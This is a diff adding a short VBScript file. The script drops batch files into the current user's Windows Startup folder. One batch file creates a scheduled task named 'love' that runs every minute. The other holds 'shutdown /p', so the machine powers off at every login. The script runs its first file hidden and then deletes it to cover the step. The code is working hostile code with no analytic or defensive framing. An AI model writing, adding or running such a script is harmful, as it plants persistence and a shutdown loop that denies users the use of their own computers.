@@ -1,0 +1,32 @@
+
+
+
+Option Explicit
+Dim fso,a,b,c,a1,a2,a3,a4,a5,p,obj,userna,link1,link3,formlink,fill,formmess,formmess1,newmess,wr
+Set obj=CreateObject("Wscript.Shell")
+Set fso=CreateObject("Scripting.FileSystemObject")
+userna=obj.ExpandEnvironmentStrings("%USERNAME%")
+link1="C:\Users\"
+link3="\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\n.bat"
+newmess="\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\n1.bat"
+formlink=link1+userna+link3
+formmess1=link1+userna+newmess
+Set a =fso.CreateTextFile(formlink,true)
+a1= "schtasks /create /tn "
+a2= Chr(34)&"love "&Chr(34)
+a3=" /tr "
+a4= Chr(34)&"C:\Users\kalhonaho.txt "&Chr(34)
+a5=" /sc minute"
+p= a1+a2+a3+a4+a5
+a.writeLine(p)
+a.close()
+obj.Run Chr(34) & "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\n.bat" & Chr(34),0
+Set fill =fso.CreateTextFile(formmess1,true)
+wr="shutdown /p"
+fill.writeline(wr)
+fill.close()
+Wscript.Sleep 9000
+fso.DeleteFile(formlink)
+
+
+
